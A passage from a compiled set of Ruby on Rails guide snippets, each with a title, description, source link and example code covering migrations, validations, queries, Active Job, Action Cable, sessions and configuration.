#<ActiveRecord::DatabaseConfigurations::UrlConfig:0x00007fc8eab020b0\n    @env_name=\"development\", @spec_name=\"primary\",\n    @config={\"adapter\"=>\"postgresql\", \"database\"=>\"my_database\", \"host\"=>\"localhost\", \"pool\"=>5}\n    @url=\"postgresql://localhost/my_database\">\n  ]\n```\n\n----------------------------------------\n\nTITLE: Setting transactional integrity for jobs in ActiveJob\nDESCRIPTION: This snippet shows how to set the `enqueue_after_transaction_commit` option for all jobs through `ApplicationJob`. This ensures that a job is only enqueued after the transaction within which it is enqueued is committed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationJob < ActiveJob::Base\n  self.enqueue_after_transaction_commit = true\nend\n```\n\n----------------------------------------\n\nTITLE: Advancing Time Across DST in Ruby\nDESCRIPTION: This snippet demonstrates how the `advance` method correctly handles Daylight Saving Time (DST) transitions when used with `Time` objects. The example shows a time in Barcelona that is advanced by one second, resulting in the time jumping forward by one hour due to the DST change.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_166\n\nLANGUAGE: ruby\nCODE:\n```\nTime.zone_default\n# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name=\"Madrid\", ...>\n\n# In Barcelona, 2010/03/28 02:00 +0100 becomes 2010/03/28 03:00 +0200 due to DST.\nt = Time.local(2010, 3, 28, 1, 59, 59)\n# => Sun Mar 28 01:59:59 +0100 2010\nt.advance(seconds: 1)\n# => Sun Mar 28 03:00:00 +0200 2010\n```\n\n----------------------------------------\n\nTITLE: Configuring Secure Token Generation on Create\nDESCRIPTION: This snippet shows how to configure secure token generation to happen only when a record is created, rather than when it is initialized. This configuration sets the `config.active_record.generate_secure_token_on` option to `:create`. The model then uses `has_secure_token on: :create` to ensure that the token is only generated upon record creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\n\nconfig.active_record.generate_secure_token_on = :create\n\n# app/models/user.rb\nclass User < ApplicationRecord\n  has_secure_token on: :create\nend\n\nrecord = User.new\nrecord.token # => nil\nrecord.save!\nrecord.token # => \"fwZcXX6SkJBJRogzMdciS7wf\"\n```\n\n----------------------------------------\n\nTITLE: Configuring PostgreSQL Date Decoding\nDESCRIPTION: This snippet demonstrates how to verify the class returned when querying a date from PostgreSQL without date decoding enabled. The result of the query 'select '2024-01-01'::date' is a Date object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Base.connection\n     .select_value(\"select '2024-01-01'::date\").class #=> Date\n```\n\n----------------------------------------\n\nTITLE: Verifying Rails Installation (bash)\nDESCRIPTION: Checks the installed Rails version by running the `rails` command with the `--version` flag in the terminal. This command confirms that the Rails gem is correctly installed and its executable is accessible in the system's PATH.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ rails --version\nRails 8.0.0\n```\n\n----------------------------------------\n\nTITLE: UUID Primary Keys Implementation\nDESCRIPTION: Shows how to implement UUID primary keys in PostgreSQL with Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_devices.rb\nenable_extension \"pgcrypto\" unless extension_enabled?(\"pgcrypto\")\ncreate_table :devices, id: :uuid do |t|\n  t.string :kind\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/device.rb\nclass Device < ApplicationRecord\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> device = Device.create\nirb> device.id\n=> \"814865cd-5a1d-4771-9306-4268f188fe9e\"\n```\n\n----------------------------------------\n\nTITLE: Creating Products Table with Exclusion Constraints - ActiveRecord Migration - Ruby\nDESCRIPTION: Creates a products table with price and availability_range columns, and defines an exclusion constraint to prevent overlapping availability ranges for identical prices. Uses the :gist index for the constraint with a custom name 'price_check'. Requires ActiveRecord migration context and PostgreSQL with support for exclusion constraints. Primary inputs are the table columns and the exclusion rule; output is the modified database schema.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_products.rb\\ncreate_table :products do |t|\\n  t.integer :price, null: false\\n  t.daterange :availability_range, null: false\\n\\n  t.exclusion_constraint \\\"price WITH =, availability_range WITH &&\\\", using: :gist, name: \\\"price_check\\\"\\nend\n```\n\n----------------------------------------\n\nTITLE: Changing a Column Type\nDESCRIPTION: This code snippet demonstrates changing the type of an existing column using the `change_column` method. The `part_number` column in the `products` table is changed to a `:text` field.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nchange_column :products, :part_number, :text\n```\n\n----------------------------------------\n\nTITLE: Building and Running Rails App with Docker\nDESCRIPTION: Commands for building, running, and managing a Rails application using the new default Docker support introduced in Rails 7.1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ docker build -t app .\n$ docker volume create app-storage\n$ docker run --rm -it -v app-storage:/rails/storage -p 3000:3000 --env RAILS_MASTER_KEY=<your-config-master-key> app\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Confirmation in Rails Model (Ruby)\nDESCRIPTION: Demonstrates the basic usage of the `confirmation` validator in a Rails `Person` model. This ensures the `email` attribute matches the value entered in a corresponding virtual attribute named `email_confirmation`. The check is only performed if `email_confirmation` is not nil.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :email, confirmation: true\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Array Type Storage in PostgreSQL with Rails\nDESCRIPTION: Shows how to use PostgreSQL's array type with Rails, including migration setup, model definition, and array querying examples. Includes GIN index creation for performance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20140207133952_create_books.rb\ncreate_table :books do |t|\n  t.string \"title\"\n  t.string \"tags\", array: true\n  t.integer \"ratings\", array: true\nend\nadd_index :books, :tags, using: \"gin\"\nadd_index :books, :ratings, using: \"gin\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/book.rb\nclass Book < ApplicationRecord\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# Usage\nBook.create title: \"Brave New World\",\n            tags: [\"fantasy\", \"fiction\"],\n            ratings: [4, 5]\n\n## Books for a single tag\nBook.where(\"'fantasy' = ANY (tags)\")\n\n## Books for multiple tags\nBook.where(\"tags @> ARRAY[?]::varchar[]\", [\"fantasy\", \"fiction\"])\n\n## Books with 3 or more ratings\nBook.where(\"array_length(ratings, 1) >= 3\")\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition with Scopes\nDESCRIPTION: Defines the Book model with belongs_to associations to Supplier and Author, and has_many associations to Review models. It includes several scopes for filtering books based on availability, publication year, and price. This demonstrates model associations and the use of scopes for defining common queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :supplier\n  belongs_to :author\n  has_many :reviews\n  has_and_belongs_to_many :orders, join_table: \"books_orders\"\n\n  scope :in_print, -> { where(out_of_print: false) }\n  scope :out_of_print, -> { where(out_of_print: true) }\n  scope :old, -> { where(year_published: ...50.years.ago.year) }\n  scope :out_of_print_and_expensive, -> { out_of_print.where(\"price > 500\") }\n  scope :costs_more_than, ->(amount) { where(\"price > ?\", amount) }\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing CSRF Protection in Rails Controller\nDESCRIPTION: Demonstrates how to enable CSRF protection in a Rails application controller to prevent cross-site request forgery attacks. This is typically added to the base ApplicationController class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  protect_from_forgery with: :exception\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Product in Controller (Ruby)\nDESCRIPTION: This Ruby code defines the `create` action in the `ProductsController`. It handles the submission of the new product form, creates a new `Product` with the permitted parameters, and redirects to the product's show page if successful, or renders the new form again if there are errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    @products = Product.all\n  end\n\n  def show\n    @product = Product.find(params[:id])\n  end\n\n  def new\n    @product = Product.new\n  end\n\n  def create\n    @product = Product.new(product_params)\n    if @product.save\n      redirect_to @product\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  private\n    def product_params\n      params.expect(product: [ :name ])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Encryption Parameter Filtering in Rails\nDESCRIPTION: Examples of configuring parameter filtering for encrypted columns in Rails logs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.add_to_filter_parameters = false\n```\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.excluded_from_filter_parameters = [:catchphrase]\n```\n\n----------------------------------------\n\nTITLE: Using Attach Method for Adding Attachments in Rails 6.0\nDESCRIPTION: Example showing how to use the #attach method to add new attachments without removing existing ones, which is the recommended approach in Rails 6.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nblob = ActiveStorage::Blob.create_after_upload!(filename: \"town.jpg\")\nuser.highlights.attach(blob)\n\nuser.highlights.count # => 2\nuser.highlights.first.filename # => \"funky.jpg\"\nuser.highlights.second.filename # => \"town.jpg\"\n```\n\n----------------------------------------\n\nTITLE: Executing Code After Routes Loaded - Ruby\nDESCRIPTION: This snippet illustrates how to execute code after Rails has finished loading the application routes, using the `config.after_routes_loaded` block. The block is executed after the routes are loaded, enabling actions like manipulating the application routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.after_routes_loaded do\n  # Code that does something with Rails.application.routes\nend\n```\n\n----------------------------------------\n\nTITLE: Acceptance Validation Examples\nDESCRIPTION: Shows various ways to implement acceptance validation for terms of service and similar requirements.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :terms_of_service, acceptance: { message: \"must be agreed to\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Moving Middleware in the Stack Using move_before and move_after - Ruby\nDESCRIPTION: These Ruby snippets illustrate reordering existing middleware in the Rails stack using config.middleware.move_before and config.middleware.move_after. Used in config/application.rb, they enable fine-grained control over middleware execution order. Inputs are the names of the middleware to move and the reference middleware. All modifications affect request handling order after server restart.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\n\\n# Move ActionDispatch::ShowExceptions to before Lifo::ShowExceptions\\nconfig.middleware.move_before Lifo::ShowExceptions, ActionDispatch::ShowExceptions\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\n\\n# Move ActionDispatch::ShowExceptions to after Lifo::ShowExceptions\\nconfig.middleware.move_after Lifo::ShowExceptions, ActionDispatch::ShowExceptions\n```\n\n----------------------------------------\n\nTITLE: Configuring Allowed Request Origins (Ruby)\nDESCRIPTION: This Ruby code configures the allowed request origins for Action Cable in the `config/application.rb` file or in an initializer. It can accept an array of strings or regular expressions to match against the origin of incoming requests. It also shows how to disable request forgery protection, allowing requests from any origin.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_28\n\nLANGUAGE: Ruby\nCODE:\n```\nconfig.action_cable.allowed_request_origins = [\"https://rubyonrails.com\", %r{http://ruby.*}]\n\n```\n\nLANGUAGE: Ruby\nCODE:\n```\nconfig.action_cable.disable_request_forgery_protection = true\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Connection (YAML)\nDESCRIPTION: This YAML snippet configures a database connection for the development environment using the PostgreSQL adapter. It specifies the database name, adapter, and connection pool size. This is an example of using config/database.yml to configure a database connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_79\n\nLANGUAGE: YAML\nCODE:\n```\ndevelopment:\n  adapter: postgresql\n  database: blog_development\n  pool: 5\n```\n\n----------------------------------------\n\nTITLE: Illustrating Validation Failure with `save` and `save!` in IRB\nDESCRIPTION: An Interactive Ruby (IRB) session demonstrating the behavior of `save` and `save!` when a validation fails (in this case, the `name` presence validation). `user.save` attempts to save, fails silently, and returns `false`. `user.save!` attempts to save, fails, and raises an `ActiveRecord::RecordInvalid` exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_21\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.new\nirb> user.save\n=> false\nirb> user.save!\nActiveRecord::RecordInvalid: Validation failed: Name can't be blank\n```\n\n----------------------------------------\n\nTITLE: Process Customers in Custom Batch Sizes using `find_in_batches` in Ruby\nDESCRIPTION: This snippet demonstrates how to specify a custom batch size of 2500 when using `find_in_batches`. This is useful for adjusting the size of the batches to optimize performance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_in_batches(batch_size: 2500) do |customers|\n  export.add_customers(customers)\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Parameters with Nested Attributes in Rails Controller\nDESCRIPTION: This Ruby code snippet shows how to permit parameters in the controller for a form with nested attributes. It uses `params.expect` to specify the permitted attributes for the `person` and its nested `addresses_attributes`. This ensures that only the allowed attributes are passed to the model, preventing mass assignment vulnerabilities.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  @person = Person.new(person_params)\n  # ...\nend\n\nprivate\n  def person_params\n    params.expect(person: [ :name, addresses_attributes: [[ :id, :kind, :street ]] ])\n  end\n```\n\n----------------------------------------\n\nTITLE: Using fields_for Helper\nDESCRIPTION: This snippet demonstrates how to use the `fields_for` helper to render fields for related model objects (Person and ContactDetail) within the same form.  The `contact_detail` form is nested within the `person_form`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_21\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |person_form| %>\n  <%= person_form.text_field :name %>\n  <%= fields_for :contact_detail, @person.contact_detail do |contact_detail_form| %>\n    <%= contact_detail_form.text_field :phone_number %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Setting Queue Name Prefix for Active Job in Rails\nDESCRIPTION: This code snippet demonstrates how to set a queue name prefix for all Active Job jobs.  It configures `queue_name_prefix` to `Rails.env`, which sets the prefix to the current Rails environment (e.g., 'production'). This will prefix all queue names, allowing for environment-specific queue management.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_job.queue_name_prefix = Rails.env\n```\n\n----------------------------------------\n\nTITLE: Retrying or Discarding Failed Active Jobs (Ruby)\nDESCRIPTION: This snippet illustrates how to configure automatic retries or discards for failed Active Jobs using `retry_on` and `discard_on`. `retry_on` allows specifying exceptions that should trigger retries, while `discard_on` specifies exceptions that should cause the job to be discarded.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nclass RemoteServiceJob < ApplicationJob\n  retry_on CustomAppException # defaults to 3s wait, 5 attempts\n\n  discard_on ActiveJob::DeserializationError\n\n  def perform(*args)\n    # Might raise CustomAppException or ActiveJob::DeserializationError\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing UUID References in Rails Associations\nDESCRIPTION: Shows how to set up UUID-based references between models using Rails associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20150418012400_create_blog.rb\nenable_extension \"pgcrypto\" unless extension_enabled?(\"pgcrypto\")\ncreate_table :posts, id: :uuid\n\ncreate_table :comments, id: :uuid do |t|\n  # t.belongs_to :post, type: :uuid\n  t.references :post, type: :uuid\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/post.rb\nclass Post < ApplicationRecord\n  has_many :comments\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/comment.rb\nclass Comment < ApplicationRecord\n  belongs_to :post\nend\n```\n\n----------------------------------------\n\nTITLE: Manual Error Addition in Validations\nDESCRIPTION: Shows how to manually add validation errors using a custom validation block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validate do |person|\n    errors.add :name, :too_short, message: \"is not long enough\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Connection with URL (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to specify the database connection using a 'url' key within the config/database.yml file. This allows defining the connection string directly within the configuration file. It can also be used to override connection information from environment variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_81\n\nLANGUAGE: YAML\nCODE:\n```\ndevelopment:\n  url: postgresql://localhost/blog_development?pool=5\n```\n\n----------------------------------------\n\nTITLE: Enabling Sessions and Cookies Middleware - Rails Configuration - Ruby\nDESCRIPTION: Demonstrates how to configure and enable session management with cookies in an API-only Rails application. Sets the session store type and key, adds ActionDispatch::Cookies middleware, and enables session management middleware with the right session options. These lines should be placed in config/application.rb before the middleware stack is built.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# This also configures session_options for use below\nconfig.session_store :cookie_store, key: \"_your_app_session\"\n\n# Required for all session management (regardless of session_store)\nconfig.middleware.use ActionDispatch::Cookies\n\nconfig.middleware.use config.session_store, config.session_options\n```\n\n----------------------------------------\n\nTITLE: File Field using form builder\nDESCRIPTION: This code snippet shows how to use the `file_field` helper within a `form_with` block to generate a file upload field.  It automatically sets the `enctype` to `multipart/form-data`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_58\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  <%= form.file_field :csv_file %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Storing Session Data in Rails\nDESCRIPTION: This snippet demonstrates how to store data in the session after a user is authenticated.  The user's ID is stored in the session, allowing it to be retrieved on subsequent requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nclass SessionsController < ApplicationController\n  def create\n    if user = User.authenticate_by(email: params[:email], password: params[:password])\n      # Save the user ID in the session so it can be used in\n      # subsequent requests\n      session[:current_user_id] = user.id\n      redirect_to root_url\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Queue Ordering Configuration\nDESCRIPTION: This YAML configuration demonstrates how to specify the order of queues that workers will fetch jobs from.  Workers process jobs in the order specified in the `queues` list.  It shows an example for the `production` environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_16\n\nLANGUAGE: YAML\nCODE:\n```\n# config/queue.yml\nproduction:\n  workers:\n    - queues:[active_storage*, mailers]\n      threads: 3\n      polling_interval: 5\n```\n\n----------------------------------------\n\nTITLE: Implementing Flash Message in Create Action - Ruby\nDESCRIPTION: This Ruby code shows how to implement a flash message in the `create` action of a controller. Upon successful saving of the article, a flash[:notice] is set with a success message and the user is redirected to the article's show page. If saving fails, the `new` view is rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  @article = Article.new(article_params)\n\n  if @article.save\n    flash[:notice] = \"Article was successfully created.\"\n    redirect_to @article\n  else\n    render \"new\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Process Customers in Batches with a Custom Start ID using `find_in_batches` in Ruby\nDESCRIPTION: This snippet demonstrates how to specify a starting customer ID (5000) when using `find_in_batches`.  It also sets a custom batch size.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_in_batches(batch_size: 2500, start: 5000) do |customers|\n  export.add_customers(customers)\nend\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting Routes with Explicit Options\nDESCRIPTION: This snippet demonstrates shallow nesting by explicitly specifying the `only` option for the nested resources. This creates nested routes for collection actions and shallow routes for member actions, providing a balance between hierarchy and route depth. It defines routes for articles and comments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles do\n  resources :comments, only: [:index, :new, :create]\nend\nresources :comments, only: [:show, :edit, :update, :destroy]\n```\n\n----------------------------------------\n\nTITLE: Conditional Validations with :if and :unless in Ruby on Rails\nDESCRIPTION: Shows how to use :if and :unless options for conditional validations. Examples include using a symbol to reference a method and using a Proc for inline conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  validates :card_number, presence: true, if: :paid_with_card?\n\n  def paid_with_card?\n    payment_type == \"card\"\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Account < ApplicationRecord\n  validates :password, confirmation: true,\n    unless: Proc.new { |a| a.password.blank? }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates :password, confirmation: true, unless: -> { password.blank? }\n```\n\n----------------------------------------\n\nTITLE: Creating a Table (Ruby)\nDESCRIPTION: This code snippet demonstrates how to create a basic table named `products` with a `name` column using the `create_table` method in a migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_26\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :products do |t|\n  t.string :name\nend\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Error Reporting in ApplicationJob\nDESCRIPTION: This Ruby code adds a `rescue_from` block to `ApplicationJob` to report job errors to Rails' error reporting service. This ensures that exceptions raised during job execution are reported.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\nclass ApplicationJob < ActiveJob::Base\n  rescue_from(Exception) do |exception|\n    Rails.error.report(exception)\n    raise exception\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Retrieving the first record in Rails\nDESCRIPTION: This code demonstrates how to retrieve the first record from the `Customer` model using the `first` method. It fetches the record ordered by the primary key (default). The `first` method returns `nil` if no record is found.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_18\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.first\n=> #<Customer id: 1, first_name: \"Lifo\">\n```\n\n----------------------------------------\n\nTITLE: Styling Error Fields in Rails Forms\nDESCRIPTION: This example shows the default HTML structure Rails generates for form fields with errors and a CSS rule to style these fields.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_76\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"field_with_errors\">\n  <input id=\"article_title\" name=\"article[title]\" size=\"30\" type=\"text\" value=\"\">\n</div>\n```\n\nLANGUAGE: css\nCODE:\n```\n.field_with_errors {\n  padding: 2px;\n  background-color: red;\n  display: table;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Default Queue Name for Active Job in Rails\nDESCRIPTION: This code snippet shows how to change the default queue name for Active Job. It configures `default_queue_name` to `:medium_priority`, meaning that jobs without a specific queue assignment will be enqueued in the 'medium_priority' queue.  This is useful for prioritizing different types of background tasks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_job.default_queue_name = :medium_priority\n```\n\n----------------------------------------\n\nTITLE: Shared Partial Caching Render with Format Example\nDESCRIPTION: Demonstrates rendering a shared partial specifying the format option to include the appropriate format.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nrender(partial: \"hotels/hotel\", collection: @hotels, formats: :html, cached: true)\n```\n\n----------------------------------------\n\nTITLE: Configure Railties Order\nDESCRIPTION: This snippet shows how to manually configure the order in which Railties/Engines are loaded within a Rails application.  It allows specifying the order in the `railties_order` array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.railties_order = [Blog::Engine, :main_app, :all]\n```\n\n----------------------------------------\n\nTITLE: Joining Multiple Associations in Rails\nDESCRIPTION: This code snippet shows how to join multiple associations (`author` and `reviews`) with the `books` table using the `joins` method in Active Record. It retrieves all `Book` objects that have both an associated `author` and at least one `review`. The generated SQL query includes INNER JOIN clauses for both `authors` and `reviews` tables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_140\n\nLANGUAGE: ruby\nCODE:\n```\nBook.joins(:author, :reviews)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n  INNER JOIN authors ON authors.id = books.author_id\n  INNER JOIN reviews ON reviews.book_id = books.id\n```\n\n----------------------------------------\n\nTITLE: Passing Arbitrary Local Variables to Partials\nDESCRIPTION: This code snippet demonstrates how to pass arbitrary local variables to a partial using the `locals:` option. The `title` variable with the value \"Products Page\" will be accessible within the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_92\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", collection: @products,\n           as: :item, locals: {title: \"Products Page\"} %>\n```\n\n----------------------------------------\n\nTITLE: Executing Raw SQL Queries in Rails Migrations\nDESCRIPTION: This snippet demonstrates how to execute raw SQL queries within Rails migrations using the 'execute' method. The 'up' method updates the 'price' column of the 'products' table to 'free', while the 'down' method reverts the change to 'original_price'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nclass UpdateProductPrices < ActiveRecord::Migration[8.1]\n  def up\n    execute \"UPDATE products SET price = 'free'\"\n  end\n\n  def down\n    execute \"UPDATE products SET price = 'original_price' WHERE price = 'free';\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Override Protocol to Adapter Mapping for Database Connection - Ruby\nDESCRIPTION: This snippet demonstrates how to override the default protocol to adapter mapping for database connections. This allows the application to use a different adapter than the one inferred from the database URL's protocol.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.protocol_adapters.mysql = \"trilogy\"\n```\n\n----------------------------------------\n\nTITLE: Generating Model with Attachment via Rails Generator (Bash)\nDESCRIPTION: Demonstrates running the rails model generator to produce a User model with an avatar:attachment column. This command scaffolds the necessary migration and model code for Active Storage integration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model User avatar:attachment\n```\n\n----------------------------------------\n\nTITLE: Accessing Merged Configuration in Rails\nDESCRIPTION: This Ruby snippet demonstrates how to access a merged configuration, where the `shared` configuration is merged into the `development` environment's configuration. It demonstrates accessing a value that exists in both the shared and the environment-specific configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_118\n\nLANGUAGE: ruby\nCODE:\n```\n# development environment\nRails.application.config_for(:example)[:foo][:bar] #=> { baz: 1, qux: 2 }\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Storage Service for Attachments in Rails\nDESCRIPTION: Shows how to override the default storage service for attachments by specifying the service option in the has_many_attached declaration. This example configures attachments to use Amazon S3.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass Message < ApplicationRecord\n  has_many_attached :images, service: :s3\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails to Use UUIDs as Primary Keys - Ruby\nDESCRIPTION: This snippet demonstrates how to configure a Rails application to use UUIDs (Universally Unique Identifiers) as the default primary key type for ActiveRecord models. By setting `primary_key_type: :uuid`, all newly generated models will use UUIDs instead of auto-incrementing integers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_77\n\nLANGUAGE: 